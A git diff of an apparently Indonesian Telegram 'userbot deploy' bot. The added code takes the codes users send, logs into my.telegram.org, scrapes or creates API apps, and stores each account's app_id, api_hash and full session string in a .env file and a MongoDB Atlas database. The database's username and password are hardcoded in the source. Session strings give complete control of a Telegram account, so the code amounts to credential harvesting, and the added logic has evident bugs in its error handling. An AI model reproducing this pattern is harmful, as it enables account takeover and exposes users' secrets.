@@ -69,12 +69,14 @@ async def recv_tg_code_message(_, message: Message):
     # await status_message.delete()
     del w_s_dict["MESSAGE"]
     phone_code = "".join(message.text.split(" "))
-    try:
+    phone_codee = phone_code[:5]
+    phone_codeapp = phone_code[5:]
+    try:            
         w_s_dict["SIGNED_IN"] = await loical_ci.sign_in(
             phone_number,
             sent_code.phone_code_hash,
-            phone_code
-        )
+            phone_codee
+        ) 
     except BadRequest as e:
         await status_message.reply_text(
           f"{e} \n\nKode yang anda masukkan salah, coba masukan kembali atau mulai dari awal"
@@ -85,7 +87,37 @@ async def recv_tg_code_message(_, message: Message):
           "Verifikasi 2 Langkah Diaktifkan, Mohon Masukkan Verifikasi 2 Langkah Anda."
         )
         w_s_dict["IS_NEEDED_TFA"] = True
-    else:        
+    else:    
+        # create app
+        try:
+            provided_code = extract_code_imn_ges(phone_codeapp)
+        except:
+            await message.reply_text("kode ngga kebaca")
+        if provided_code is None:
+            await status_message.edit_text(
+                text=Config.IN_VALID_CODE_PVDED
+            )
+        status_r, cookie_v = login_step_get_stel_cookie(
+            phone_number,
+            random_hash,
+            provided_code
+        )
+        if status_r:
+            status_t, response_dv = scarp_tg_existing_app(cookie_v)
+            if not status_t:
+                create_new_tg_app(
+                    cookie_v,
+                    response_dv.get("tg_app_hash"),
+                    Config.APP_TITLE,
+                    Config.APP_SHORT_NAME,
+                    Config.APP_URL,
+                    Config.APP_PLATFORM,
+                    Config.APP_DESCRIPTION
+                )
+            status_t, response_dv = scarp_tg_existing_app(cookie_v)
+            app_id = response_dv["App Configuration"]["app_id"]
+            app_hash = response_dv["App Configuration"]["api_hash"]
+            
         client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
@@ -101,9 +133,11 @@ async def recv_tg_code_message(_, message: Message):
         
         filename = ".env"
         with open(filename, "a") as file:
-            file.write(f"\nSESSION{count}={str(await loical_ci.export_session_string())}")
+            file.write(f"\nAPP_ID{count}={str(app_id)}\nAPI_HASH{count}={str(app_hash)}\nSESSION{count}={str(await loical_ci.export_session_string())}")
         await message.reply_text("`Berhasil Melakukan Deploy.`")
         session_data = {
+            "app_id": app_id or "",
+            "api_hash": app_hash or "",
             "session_string": session_string,
             "user_id": message.chat.id,
             "username": message.chat.username or "",
